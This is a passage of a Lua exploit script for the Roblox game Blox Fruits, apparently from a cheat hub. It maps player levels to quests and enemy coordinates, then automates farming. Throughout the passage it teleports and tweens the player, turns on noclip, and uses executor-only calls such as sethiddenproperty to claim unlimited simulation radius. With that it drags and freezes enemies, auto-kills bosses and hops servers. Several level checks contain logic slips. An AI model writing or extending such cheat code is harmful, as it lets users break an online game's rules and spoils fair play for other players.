                elseif MyLevel >= 2075 and MyLevel <= 2099 then
                    Ms = "Peanut Scout"
                    NameQuest = "NutsIslandQuest"
                    LevelQuest = 1
                    NameMon = "Peanut Scout"
                    CFrameQuest = CFrame.new(-2104.17163, 38.1299706, -10194.418, 0.758814394, -1.38604395e-09, 0.651306927, 2.85280208e-08, 1, -3.1108879e-08, -0.651306927, 4.21863646e-08, 0.758814394)
                    CFrameMon = CFrame.new(-2098.07544, 192.611862, -10248.8867, 0.983392298, -9.57031787e-08, 0.181492642, 8.7276355e-08, 1, 5.44169616e-08, -0.181492642, -3.76732068e-08, 0.983392298)
                elseif MyLevel >= 2100 and MyLevel <= 2124 then
                    Ms = "Peanut President"
                    NameQuest = "NutsIslandQuest"
                    LevelQuest = 2
                    NameMon = "Peanut President"
                    CFrameQuest = CFrame.new(-2104.17163, 38.1299706, -10194.418, 0.758814394, -1.38604395e-09, 0.651306927, 2.85280208e-08, 1, -3.1108879e-08, -0.651306927, 4.21863646e-08, 0.758814394)
                    CFrameMon = CFrame.new(-1876.95959, 192.610947, -10542.2939, 0.0553516336, -2.83836812e-08, 0.998466909, -6.89634405e-10, 1, 2.84654931e-08, -0.998466909, -2.26418861e-09, 0.0553516336)
                elseif MyLevel >= 2125 and MyLevel <= 2149 then
                    Ms = "Ice Cream Chef"
                    NameQuest = "IceCreamIslandQuest"
                    LevelQuest = 1
                    NameMon = "Ice Cream Chef"
                    CFrameQuest = CFrame.new(-820.404358, 65.8453293, -10965.5654, 0.822534859, 5.24448502e-08, -0.568714678, -2.08336317e-08, 1, 6.20846663e-08, 0.568714678, -3.92184099e-08, 0.822534859)
                    CFrameMon = CFrame.new(-821.614075, 208.39537, -10990.7617, -0.870096624, 3.18909272e-08, 0.492881238, -1.8357893e-08, 1, -9.71107568e-08, -0.492881238, -9.35439957e-08, -0.870096624)
                elseif MyLevel >= 2150 and MyLevel <= 2199 then 
                    Ms = "Ice Cream Commander"
                    NameQuest = "IceCreamIslandQuest"
                    LevelQuest = 2
                    NameMon = "Ice Cream Commander"
                    CFrameQuest = CFrame.new(-819.376526, 67.4634171, -10967.2832)
                    CFrameMon = CFrame.new(-610.11669921875, 208.26904296875, -11253.686523438)
                elseif MyLevel >= 2200 and MyLevel <= 2224 then 
                    Ms = "Cookie Crafter"
                    NameQuest = "CakeQuest1"
                    LevelQuest = 1
                    NameMon = "Cookie Crafter"
                    CFrameQuest = CFrame.new(-2020.6068115234375, 37.82400894165039, -12027.80859375)
                    CFrameMon = CFrame.new(-2286.684326171875, 146.5656280517578, -12226.8818359375)
                elseif MyLevel >= 2225 and MyLevel <= 2249 then 
                    Ms = "Cake Guard"
                    NameQuest = "CakeQuest1"
                    LevelQuest = 2
                    NameMon = "Cake Guard"
                    CFrameQuest = CFrame.new(-2020.6068115234375, 37.82400894165039, -12027.80859375)
                    CFrameMon = CFrame.new(-1817.9747314453125, 209.5632781982422, -12288.9228515625)
                elseif MyLevel >= 2250 and MyLevel <= 2274 then 
                    Ms = "Baking Staff"
                    NameQuest = "CakeQuest2"
                    LevelQuest = 1
                    NameMon = "Baking Staff"
                    CFrameQuest = CFrame.new(-1928.31763, 37.7296638, -12840.626)
                    CFrameMon = CFrame.new(-1818.347900390625, 93.41275787353516, -12887.66015625)
                elseif MyLevel == 2275 or MyLevel <= 2299 then
                    Ms = "Head Baker"
                    CFrameMon = CFrame.new(-2068.284912109375, 68.5050048828125, -12950.775390625)
                    LevelQuest = 2
                    NameQuest = "CakeQuest2"
                    NameMon = "Head Baker"
                    CFrameQuest = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 4.22142143e-08, 0.250778586, 4.74911062e-08, 1, 1.49904711e-08, -0.250778586, 2.64211941e-08, -0.96804446)
                elseif MyLevel == 2300 or MyLevel <= 2324 then
                    Ms = "Cocoa Warrior"
                    CFrameMon = CFrame.new(43.3896598815918, 56.341636657714844, -12324.78515625)
                    LevelQuest = 1
                    NameQuest = "ChocQuest1"
                    NameMon = "Cocoa Warrior"
                    CFrameQuest = CFrame.new(231.88818359375, 24.769283294677734, -12202.1337890625)
                elseif MyLevel == 2325 or MyLevel <= 2349 then
                    Ms = "Chocolate Bar Battler"
                    CFrameMon = CFrame.new(719.6046752929688, 69.9678955078125, -12597.25390625)
                    LevelQuest = 2
                    NameQuest = "ChocQuest1"
                    NameMon = "Chocolate Bar Battler"
                    CFrameQuest = CFrame.new(231.88818359375, 24.769283294677734, -12202.1337890625)
                elseif MyLevel <= 2374 then
                    Ms = "Sweet Thief"
                    CFrameMon = CFrame.new(155.99618530273438, 54.82904815673828, -12580.7265625)
                    LevelQuest = 1
                    NameQuest = "ChocQuest2"
                    NameMon = "Sweet Thief"
                    CFrameQuest = CFrame.new(151.1981201171875, 24.828855514526367, -12778.08984375)
                elseif MyLevel <= 2449 then
                    Ms = "Candy Rebel"
                    CFrameMon = CFrame.new(-7.535787105560303, 35.526527404785156, -12896.34375)
                    LevelQuest = 2
                    NameQuest = "ChocQuest2"
                    NameMon = "Candy Rebel"
                    CFrameQuest = CFrame.new(151.1981201171875, 24.828855514526367, -12778.08984375)
                elseif MyLevel <= 2474 then
                    Ms = "Isle Outlaw"
                    CFrameMon = CFrame.new(-16241.5107, 121.569138, -185.911652)
                    LevelQuest = 1
                    NameQuest = "TikiQuest1"
                    NameMon = "Isle Outlaw"
                    CFrameQuest = CFrame.new(-16548.81640625, 55.60599136352539, -172.8125)
                elseif MyLevel <= 2499 then
                    Ms = "Island Boy"
                    CFrameMon = CFrame.new(-16946.541, 115.841362, -140.827713)
                    LevelQuest = 2
                    NameQuest = "TikiQuest1"
                    NameMon = "Island Boy"
                    CFrameQuest = CFrame.new(-16548.81640625, 55.60599136352539, -172.8125)
                elseif MyLevel <= 2524 then
                    Ms = "Sun-kissed Warrior"
                    CFrameMon = CFrame.new(-16191.3447, 21.656559, 968.527344)
                    LevelQuest = 1
                    NameQuest = "TikiQuest2"
                    NameMon = "kissed"
                    CFrameQuest = CFrame.new(-16539.3359, 55.6565514, 1050.70544)
                elseif MyLevel >= 2525 then
                    Ms = "Isle Champion"
                    CFrameMon = CFrame.new(-16813.209, 21.656559, 1058.44409)
                    LevelQuest = 2
                    NameQuest = "TikiQuest2"
                    NameMon = "Isle Champion"
                    CFrameQuest = CFrame.new(-16539.3359, 55.6565514, 1050.70544)
                end
            end

            return {
                QuestLevel = LevelQuest,
                QuestGiverPosition = CFrameQuest,
                NPCName = Ms,
                QuestNPCName = NameMon,
                QuestName = NameQuest,
                MyLevel = MyLevel,
                NPCPosition = CFrameMon
            }
        end

        function getDistance(CFrame)
            return (CFrame.Position - LP.Character.HumanoidRootPart.Position).Magnitude
        end
        local function toPoint(cframe)
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            if Distance > 4000 then
                cframe = CFrame.new(cframe.x, cframe.y + 100, cframe.z)
            end
            if Distance < 25 then
                LP.Character.HumanoidRootPart.CFrame = cframe
            elseif Distance < 50 then
                LP.Character.HumanoidRootPart.CFrame = cframe
            end
            Speed = _G.TweenSpeed
            game:GetService("TweenService"):Create(
                LP.Character.HumanoidRootPart,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end

        local function followTarget(cframe)
            if type(cframe) == "vector" then
                cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            end
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            if Distance > 4000 then
                cframe = CFrame.new(cframe.X, cframe.Y + 100, cframe.Z)
            end
            if Distance == nil then return end
            cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            if Distance >= 1000 then
                Speed = 220
            end
            if Distance < 1000 and Distance >= 750 then
                Speed = 230
            end
            if Distance < 25 then
                Speed = 600
            elseif Distance < 50 then
                Speed = 600
            elseif Distance < 150 then
                Speed = 500
            elseif Distance < 250 then
                Speed = 400
            elseif Distance < 500 then
                Speed = 300
            elseif Distance < 750 then
                Speed = 250
            end
            game:GetService("TweenService"):Create(
                LP.Character.HumanoidRootPart,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end

        local function toTarget(cframe)
            if type(cframe) == "vector" then
                cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            end
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            if Distance > 4000 then
                cframe = CFrame.new(cframe.X, cframe.Y + 100, cframe.Z)
            end
            if Distance == nil then return end
            cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            if Distance < 25 then
                LP.Character.HumanoidRootPart.CFrame = cframe
            end
            Speed = _G.TweenSpeed
            game:GetService("TweenService"):Create(
                LP.Character.HumanoidRootPart,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end

        local function GetIsLand(...)
            local RealtargetPos = {...}
            local targetPos = RealtargetPos[1]
            local RealTarget
            if type(targetPos) == "vector" then
                RealTarget = targetPos
            elseif type(targetPos) == "userdata" then
                RealTarget = targetPos.Position
            elseif type(targetPos) == "number" then
                RealTarget = CFrame.new(unpack(RealtargetPos))
                RealTarget = RealTarget.p
            end
        
            local ReturnValue
            local CheckInOut = math.huge;
            if LP.Team then
                for i,v in pairs(game.Workspace._WorldOrigin.PlayerSpawns:FindFirstChild(tostring(LP.Team)):GetChildren()) do 
                    local ReMagnitude = (RealTarget - v:GetModelCFrame().p).Magnitude;
                    if ReMagnitude < CheckInOut then
                        CheckInOut = ReMagnitude;
                        ReturnValue = v.Name
                    end
                end
                if ReturnValue then
                    return ReturnValue
                end 
            end
        end

        function getMyBoat()
            for i,v in pairs(workspace.Boats:GetChildren()) do
                if v:FindFirstChild("Owner") then
                    if v.Owner.Value == LP then
                        return v
                    end
                end
            end
            return false
        end

        function getPlayerBoat(plName)
            for i,v in pairs(workspace.Boats:GetChildren()) do
                if v:FindFirstChild("Owner") then
                    if v.Owner.Value == game.Players[plName] then
                        return v
                    end
                end
            end
            return false
        end
        
        function buyBoat()
            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables").BeastHunter then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat", "Beast Hunter")
            else
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat", "Guardian")
            end
        end

        function getDistanceBoat(CFrame)
            if getMyBoat() then
                return (CFrame.Position - getMyBoat().VehicleSeat.Position).Magnitude
            else
                return math.huge
            end
        end

        function toPlayerBoat(plName)
            local boat = getPlayerBoat(plName)
            if boat then
                toPoint(boat.VehicleSeat.CFrame * CFrame.new(0,30,0))
            end
        end

        function toBoat()
            local myBoat = getMyBoat()
            if myBoat then
                toPoint(myBoat.VehicleSeat.CFrame)
            end
        end

        function isOnBoat()
            local myBoat = getMyBoat()
            if myBoat then
                if myBoat.VehicleSeat:FindFirstChild("SeatWeld") and LP.Character.Humanoid.Sit == true then
                    return true
                else
                    return false
                end
            else 
                return false
            end
        end

        function dismountBoat()
            local myBoat = getMyBoat()
            if myBoat then
                if myBoat.VehicleSeat:FindFirstChild("SeatWeld") then
                    LP.Character.Humanoid.Sit = false
                else
                    return true
                end
            else 
                return true
            end
        end

        function toBoatSeaBeast()
            local myBoat = getMyBoat()
            if not myBoat then
                local dealerPos = CFrame.new(92.9887619, 11.373209, 2954.28418, 0.593479872, 1.64508862e-09, -0.80484885, 5.52274804e-09, 1, 6.11633899e-09, 0.80484885, -8.07490164e-09, 0.593479872)
                if getDistance(dealerPos) > 20 then
                    if useNearestEntrance(dealerPos) then
                        StopTween()
                    end
                    toPoint(dealerPos)
                    wait()
                    toBoat()
                else
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat", "Guardian")
                    wait()
                    toBoat()
                end
            else
                repeat wait()
                    toPoint(myBoat.VehicleSeat.CFrame)
                until myBoat.VehicleSeat:FindFirstChild("SeatWeld")
            end
        end

        function bringBoat(cframe)
            if getMyBoat() then
                getMyBoat().VehicleSeat.CFrame = cframe
            end
        end

        function stopBoat()
            cframe = getMyBoat().VehicleSeat.CFrame
            game:GetService("TweenService"):Create(
                getMyBoat().VehicleSeat,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end

        function tweenBoat(cframe)
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            Speed = 300
            game:GetService("TweenService"):Create(
                getMyBoat().VehicleSeat,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end        
        

        function InMyNetWork(object)
            if isnetworkowner then
                return isnetworkowner(object)
            else
                if (object.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 750 then 
                    return true
                end
                return false
            end
        end
        spawn(function()
            while true do wait()
                if setscriptable then
                    setscriptable(LP, "SimulationRadius", true)
                end
                if sethiddenproperty then
                    sethiddenproperty(LP, "SimulationRadius", math.huge)
                end
            end
        end)

        function EquipWeapon(Tool)
            if Tool == 'Fruit' then Tool = "Blox Fruit" end
            pcall(function()
                if LP.Character:FindFirstChildOfClass("Tool") and LP.Character:FindFirstChildOfClass("Tool").ToolTip == Tool then return end
                for i,v in pairs(LP.Backpack:GetChildren()) do
                    if v.ToolTip == Tool then 
                        LP.Character.Humanoid:EquipTool(v) 
                        return
                    end
                end
            end)
        end
        function UnEquipWeapon(Weapon)
            if LP.Character:FindFirstChild(Weapon) then
                LP.Character:FindFirstChild(Weapon).Parent = LP.Backpack
            end
        end
        function Bypass(Point)
            toTarget(LP.Character.HumanoidRootPart.CFrame)
            wait(1.5)
            _G.StopTween = true
            _G.StertScript = false
            if not LP.Character:FindFirstChild("Head") then return end
            LP.Character.Head:Destroy()
            LP.Character.HumanoidRootPart.CFrame = Point * OffsetCFrame()
            wait(.2)
            LP.Character.HumanoidRootPart.CFrame = Point
            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
            wait(.1)
            LP.Character.HumanoidRootPart.CFrame = Point * OffsetCFrame()
            LP.Character.HumanoidRootPart.Anchored = true
            wait(.1)
            LP.Character.HumanoidRootPart.CFrame = Point
            wait(0.5)
            LP.Character.HumanoidRootPart.Anchored = false
        
            _G.StopTween = false
            _G.StertScript = false
            _G.Clip = false
            if LP.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
                LP.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
            end
            _G.Clip = false
        end
        
        spawn(function()
            while wait() do
                if _G.AutoFarmPlayer then
                    local args = {
                        [1] = "EnablePvp"
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                wait(2)
            end
        end)

        spawn(function()
            while task.wait() do 
                if NoClip or _G.AutoFarmLevel then
                    if LP.Character:WaitForChild("Humanoid").Sit == true then
                        if not AutoSeaBeast and not AutoSeaBeastRaceV3 then
                            LP.Character:WaitForChild("Humanoid").Sit = false
                        end
                    end

                    if LP.Character:FindFirstChild("HumanoidRootPart") then
                        if not LP.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1") then
                            if LP.Character:WaitForChild("Humanoid").Sit == true then
                                if not AutoSeaBeast and not AutoSeaBeastRaceV3 then
                                    LP.Character:WaitForChild("Humanoid").Sit = false
                                end
                            end
                            local BodyVelocity = Instance.new("BodyVelocity")
                            BodyVelocity.Name = "BodyVelocity1"
                            BodyVelocity.Parent =  LP.Character.HumanoidRootPart
                            BodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
                            BodyVelocity.Velocity = Vector3.new(0, 0, 0)
                        end
                    end
                    for _, v in pairs(LP.Character:GetDescendants()) do
                        if v:IsA("BasePart") then
                            v.CanCollide = false    
                        end
                    end
                else
                    if LP.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1") then
                        LP.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1"):Destroy()
                    end
                end
            end
        end)
        spawn(function()
            pcall(function()
                game:GetService("RunService").Stepped:Connect(function()
                    if NoClip or _G.AutoFarmLevel then
                        if not LP.Character.Head:FindFirstChild("BodyVelocity") then
                            local ag = Instance.new("BodyVelocity")
                            ag.Velocity = Vector3.new(0, 0, 0)
                            ag.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            ag.P = 9000
                            ag.Parent = LP.Character.Head
                            for r, v in pairs(LP.Character:GetDescendants()) do
                                if v:IsA("BasePart") then
                                    v.CanCollide = false
                                end
                            end
                        end
                        for _, v in pairs(LP.Character:GetDescendants()) do
                            if v:IsA("BasePart") then
                                v.CanCollide = false    
                            end
                        end
                    elseif not NoClip and LP.Character.Head:FindFirstChild("BodyVelocity") then
                        LP.Character.Head:FindFirstChild("BodyVelocity"):Destroy()
                    end
                end)
            end)
        end)


 
        -- kaitun mode
        _G.PosMon = nil
        spawn(function()
            while task.wait() do
                st, err = pcall(function()
                    if BringMobFarm then
                        if first_sea then 
                            range = 300 
                        end
                        if second_sea then
                            if GetIsLand(LP.Character.HumanoidRootPart.CFrame) == "Ship" then
                                range = 150
                            else
                                if getgenv().EuphoriaSettings["Auto Rengoku"] then
                                    range = 200
                                else
                                    range = 300
                                end
                            end 
                        end
                        if third_sea then
                            if FarmBones or FarmBonesCDK or FarmBonesGH then
                                range = 200
                            else
                                range = 300
                            end
                        end
                        for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                            pcall(function()
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and not string.find(v.Humanoid.DisplayName, "Boss") and v:FindFirstChild("HumanoidRootPart") and getDistance(v.HumanoidRootPart.CFrame) <= range then
                                    if getDistance(PosMon) < 1000 then
                                        v.HumanoidRootPart.CFrame = PosMon
                                        v.HumanoidRootPart.Size = Vector3.new(20,20,20)                                               
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Head.CanCollide = false
                                        v.Humanoid.JumpPower = 0
                                        v.Humanoid.WalkSpeed = 0
                                        if v.Humanoid:FindFirstChild("Animator") then
                                            v.Humanoid.Animator:Destroy()
                                        end
                                        v.Humanoid:ChangeState(14)
                                        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                                    end
                                end
                            end)
                        end
                    end
                end)
            end
        end)
        spawn(function()
            while task.wait() do
                st, err = pcall(function()
                    if BringMobFarmMastery then
                        range = 400
                        for i,vM in pairs(game.Workspace.Enemies:GetChildren()) do
                            pcall(function()
                                if PosMonMastery and FarmMasteryTarget and vM.Name == FarmMasteryTarget.Name and vM:FindFirstChild("Humanoid") and vM:FindFirstChild("HumanoidRootPart") and not string.find(vM.Humanoid.DisplayName, "Boss") and vM:FindFirstChild("HumanoidRootPart") and (vM.HumanoidRootPart.CFrame.Position - PosMonMastery.Position).Magnitude <= range then
                                    vM.HumanoidRootPart.CFrame = PosMonMastery
                                    vM.HumanoidRootPart.Size = Vector3.new(20,20,20)                                               
                                    vM.HumanoidRootPart.CanCollide = false
                                    vM.Head.CanCollide = false
                                    vM.Humanoid.JumpPower = 0
                                    vM.Humanoid.WalkSpeed = 0
                                    if vM.Humanoid:FindFirstChild("Animator") then
                                        vM.Humanoid.Animator:Destroy()
                                    end
                                    vM.Humanoid:ChangeState(14)
                                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                                end
                            end)
                        end
                    end
                end)
            end
        end)

        

        local function farmSkyGuards()
            pos = CFrame.new(-4716.95703, 853.089722, -1933.925427)
            if getDistance(pos) > 3000 then
                useNearestEntrance(pos)
                wait(.1)
                toPoint(pos)
            else
                toPoint(pos)
            end
            local mobsKilled = 0
            repeat wait()
                local MyLevel = LP.Data.Level.Value
                local QuestC = LP.PlayerGui.Main.Quest
                if MyLevel > 20 then
                    if LP.PlayerGui.Main.PvpDisabled.Visible == true then
                        if string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter"), "We heard") then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("EnablePvp")
                        end
                    else
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("PlayerHunter")
                    end
                end
                if game:GetService("Workspace").Enemies:FindFirstChild("God's Guard") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "God's Guard" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                repeat task.wait()
                                    PosMon = v.HumanoidRootPart.CFrame
                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Humanoid.WalkSpeed = 0
                                    v.Head.CanCollide = false
                                    BringMobFarm = true
                                    PosMon = v.HumanoidRootPart.CFrame
                                    EquipWeapon(_G.SelectWeapon)
                                    v.HumanoidRootPart.Transparency = 0.9
                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                until not v.Parent or v.Humanoid.Health <= 0 or not v:FindFirstChild("HumanoidRootPart")
                                mobsKilled = 1
                            end
                        end
                    end
                else
                    toPoint(pos * OffsetCFrame())
                end
            until QuestC.Visible == true or mobsKilled == 1
        end
        
        local function isPlayerHunterQuest(Quest) 
            for i,v in pairs(Players:GetChildren()) do
                if string.find(Quest.Container.QuestTitle.Title.Text, v.Name) then
                    return true
                end
            end
            return false
        end
        
        local function teleportToSecondSea()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
        end

        local function teleportToThirdSea()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
        end

        local function doSecondSea()
            if game.Workspace.Map.Ice.Door.Transparency == 0 then
                local args = {
                    [1] = "DressrosaQuestProgress",
                    [2] = "Detective"
                }
                ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                wait(2)
                if LP.Backpack:FindFirstChild("Key") then
                    local tool = LP.Backpack:FindFirstChild("Key")
                    wait(.4)
                    LP.Character.Humanoid:EquipTool(tool)
                    repeat wait()
                        toTarget(game.Workspace.Map.Ice.Door.CFrame)
                        wait(1)
                    until getDistance(game.Workspace.Map.Ice.Door.CFrame) < 10
                    wait(1)
                    if getDistance(game.Workspace.Map.Ice.Door.CFrame) < 5 then
                        repeat wait()
                            local tool = LP.Backpack:FindFirstChild("Key")
                            wait(.4)
                            LP.Character.Humanoid:EquipTool(tool)
                            game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
                            wait(1)
                        until game.Workspace.Map.Ice.Door.Transparency == 1 or not LP.Backpack:FindFirstChild("Key")
                    end
                    local entity = 0
                    for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                        if v.Humanoid.DisplayName == "Ice Admiral [Lv. 700] [Boss]" then
                            entity = 1
                            repeat task.wait()
                                PosMon = v.HumanoidRootPart.CFrame
                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                v.HumanoidRootPart.CanCollide = false
                                v.Humanoid.WalkSpeed = 0
                                v.Head.CanCollide = false
                                BringMobFarm = true
                                PosMon = v.HumanoidRootPart.CFrame
                                EquipWeapon(_G.SelectWeapon)
                                v.HumanoidRootPart.Transparency = 0.9
                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                            until not v.Parent or v.Humanoid.Health <= 0 or not v:FindFirstChild("HumanoidRootPart")
                        end
                    end
                    if not entity then HopServer() end
                    wait(.5)
                    teleportToSecondSea()
                end
            else
                local entity = 0
                for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                    if v.Humanoid.DisplayName == "Ice Admiral [Lv. 700] [Boss]" then
                        entity = 1
                        repeat task.wait()
                            PosMon = v.HumanoidRootPart.CFrame
                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                            v.HumanoidRootPart.CanCollide = false
                            v.Humanoid.WalkSpeed = 0
                            v.Head.CanCollide = false
                            BringMobFarm = true
                            PosMon = v.HumanoidRootPart.CFrame
                            EquipWeapon(_G.SelectWeapon)
                            v.HumanoidRootPart.Transparency = 0.9
                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                        until not v.Parent or v.Humanoid.Health <= 0 or not v:FindFirstChild("HumanoidRootPart")
                    end
                end
                if not entity then HopServer() end
                
                
                wait(.5)
                teleportToSecondSea()
            end
        end


        wait(0.5)
        game:GetService("GuiService").ErrorMessageChanged:Connect(function(err)
            if _G.AutoFarmLevel or _G.AutoRejoinServer or getgenv().EuphoriaSettings['Auto Rejoin'] then 
                if err and not string.find(err, "eleport") and string.len(err) > 10 then
                    if #game.Players:GetChildren() < 3 then
                        HopServer()
                    else
                        TeleportService:Teleport(game.PlaceId, LP)
                    end
                end
            end
        end)

        

        _G.KillingPlayer = false
        function getClosest(NPCs)
            dist = math.huge
            local t = false
            for i,v in pairs(NPCs) do
                for n,b in pairs(game.Workspace.Enemies:GetChildren()) do
                    if b:FindFirstChild("Humanoid") and b:FindFirstChild("HumanoidRootPart") then
                        if string.find(b.Name, v) and getDistance(b.HumanoidRootPart.CFrame) < dist and b.Humanoid.Health > 0 then
                            t = b
                            dist = getDistance(b.HumanoidRootPart.CFrame)
                        end
                    end
                end
                for n,b in pairs(game.ReplicatedStorage:GetChildren()) do
                    if b:FindFirstChild("Humanoid") and b:FindFirstChild("HumanoidRootPart") then
                        if string.find(b.Name, v) and getDistance(b.HumanoidRootPart.CFrame) < dist and b.Humanoid.Health > 0 then
                            t = b
                            dist = getDistance(b.HumanoidRootPart.CFrame)
                        end
                    end
                end
            end
            return t
        end
        function getNearestNPCSpawnPoint(NPCName)
            local dist = math.huge
            local point = {}
            for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                if string.find(v.Name, NPCName) then
                    if getDistance(v.CFrame) < dist then
                        dist = getDistance(v.CFrame)
                        table.insert(point, v)
                    end
                end
            end
            return point[#point]
        end
        function getSpawnPoints(NPCs)
            spawnPoints = {}
            for q,npcname in pairs(NPCs) do
                for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                    if string.find(v.Name, npcname) then
                        table.insert(spawnPoints, v.CFrame)
                    end
                end
            end
            return spawnPoints
        end

        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Rengoku"] and not isWeaponInInventory("Rengoku") then
                        if not LP.Backpack:FindFirstChild("Hidden Key") then
                            if getgenv().EuphoriaSettings["Auto Rengoku Hop"] then
                                if game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral") and game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral"):FindFirstChild("HumanoidRootPart") and game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral").Humanoid.Health > 0 then
                                    v = game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health > 0 then 
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().EuphoriaSettings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
                                elseif ReplicatedStorage:FindFirstChild("Awakened Ice Admiral") and ReplicatedStorage:FindFirstChild("Awakened Ice Admiral"):FindFirstChild("HumanoidRootPart") and ReplicatedStorage:FindFirstChild("Awakened Ice Admiral").Humanoid.Health > 0  then
                                    v = ReplicatedStorage:FindFirstChild("Awakened Ice Admiral")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health > 0 then 
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().EuphoriaSettings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
                                else
                                    HopServer()
                                end
                            else
                                if game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral") then
                                    v = game.Workspace.Enemies:FindFirstChild("Awakened Ice Admiral")
                                    if v:FindFirstChild("HumanoidRootPart") then
                                        if v.Humanoid.Health > 0 then 
                                            repeat task.wait()
                                                EquipWeapon(_G.SelectWeapon)
                                                toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                v.Humanoid.WalkSpeed = 0
                                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                                v.Humanoid:ChangeState(14)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                BringMobFarm = false
                                                RenMon = v.Name
                                                RenPos = v.HumanoidRootPart.CFrame
                                                PosMon = v.HumanoidRootPart.CFrame
                                            until not getgenv().EuphoriaSettings["Auto Rengoku"] or not v.Parent or v.Humanoid.Health <= 0
                                        end
                                    else
                                        toTarget(LP.Character.HumanoidRootPart.CFrame)
                                    end
